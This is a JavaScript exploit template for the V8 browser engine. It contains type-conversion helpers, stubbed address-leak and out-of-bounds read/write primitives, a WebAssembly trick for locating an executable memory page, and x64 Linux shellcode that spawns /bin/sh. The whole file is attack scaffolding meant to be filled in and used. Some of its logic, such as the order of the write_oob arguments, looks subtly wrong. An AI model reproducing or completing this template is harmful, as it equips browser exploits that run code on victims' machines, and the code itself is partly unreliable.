// (1) convert stuff
var _b = new ArrayBuffer(16);
var _f = new Float64Array(_b);
var _i = new BigUint64Array(_b);

// converts float to big unsigned int
function f2i(f)
{
	_f[0] = f;
	return _i[0];
}

// converts big unsigned int to float
function i2f(i)
{
	_i[0] = i;
	return _f[0];
}

// converts to hex format
function hex(i)
{
	return "0x"+i.toString(16).padStart(16,"0");
}

// convert stuff 2
var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);

function d2u(v) {
  f64[0] = v;
  return u32;
}

function u2d(lo, hi) {
  u32[0] = lo;
  u32[1] = hi;
  return f64[0];
}

function hex_2(lo, hi) {
  if( lo == 0 ) {
    return ("0x" + hi.toString(16) + "-00000000");
  }
  if( hi == 0 ) {
    return ("0x" + lo.toString(16));
  }
  return ("0x" + hi.toString(16) + "-" + lo.toString(16));
}


// exploit primitive

// 2. leaking object's address
function addressOf(obj_to_leak)
{
 // from the leak vuln print the obj_to_leak addr
}

// 3. turn addr to object
function fakeObject(addr_to_fake) { }

// 4. read data from addr using OOB-read or aar(arbitrary address read)
function read_oob(addr, length) { }

// 5. write data to addr using OOB-write or aaw(arbitrary address write)
function write_oob(addr, data) { }


// 6. return rwx addr: 
//  Function–>shared_info–>WasmExportedFunctionData–>instance->instance+0x88
//
// create wasm shellcode
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
//
//
function rwx_page_addr() {
  // Without compression pointer
  var shared_info_addr = read_oob(f_addr + 0x18n, 8) - 0x1n;
  var wasm_exported_func_data_addr = read_oob(shared_info_addr + 0x8n, 8) - 0x1n;
  var wasm_instance_addr = read_oob(wasm_exported_func_data_addr + 0x10n, 8) - 0x1n;
  var rwx_page_addr = read_oob(wasm_instance_addr + 0x80n, 8);
  var rwx_page_addr_2 = read_oob(shared_info_addr - 0x120n, 8);
  console.log("[+]leak rwx_page_addr: " + hex(rwx_page_addr) + " == " + hex(rwx_page_addr_2));
  
  // With compression pointer
  var shared_info_addr = read_oob(f_addr + 0xc, 4) - 0x1;
  var wasm_exported_func_data_addr = read_oob(shared_info_addr + 0x4, 4) - 0x1;
  var wasm_instance_addr = read_oob(wasm_exported_func_data_addr + 0x8, 4) - 0x1;
  var rwx_page_addr = read_oob(wasm_instance_addr + 0x60, 8);
  console.log("[+]leak rwx_page_addr: " + hex(rwx_page_addr));
}


// 7. Dataview object aar aaw use case
var buffer = new ArrayBuffer(16);
var view = new DataView(buffer);
//
view.setUint32(0, 0x44434241, true);
console.log(view.getUint8(0, true));
%DebugPrint(buffer);
%DebugPrint(view);


// 8. shellcode
function run_shellcode(rwx_page_addr) {
  /* /bin/sh for linux x64
    char shellcode[] = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f \x2f\x62\x69\x6e\x2f\x73\x68\x53 \x54\x5f\x52\x57\x54\x5e\x0f\x05";
  */
  var shellcode = [
    0x2fbb485299583b6an,
    0x5368732f6e69622fn,
    0x050f5e5457525f54n
  ];

  var data_buf = new ArrayBuffer(24);
  var data_view = new DataView(data_buf);
  var buf_backing_store_addr = addressOf(data_buf) + 0x20n;

  write_oob(rwx_page_addr, buf_backing_store_addr);

  data_view.setFloat64(0, i2f(shellcode[0]), true);
  data_view.setFloat64(8, i2f(shellcode[1]), true);
  data_view.setFloat64(16, i2f(shellcode[2]), true);

  // wasmInstance.exports.main
  f();
}

// 9. sleep
function sleep(sleepDuration) {
  var now = new Date().getTime();
  while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
}

// 10. trigger gc
function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }

// 11. log
function log(msg) {
  document.write(msg + "</br>");
}

// 12. hexdump
function hexdump(arr, lim) {
  for(let i = 0; i < lim/2; i++) {
    tmp = hex( f2i(arr[i]) );
    tmp2 = hex( f2i(arr[i+1]) );
    console.log("[" + i + "] : " + tmp + "   " + tmp2);
  }
}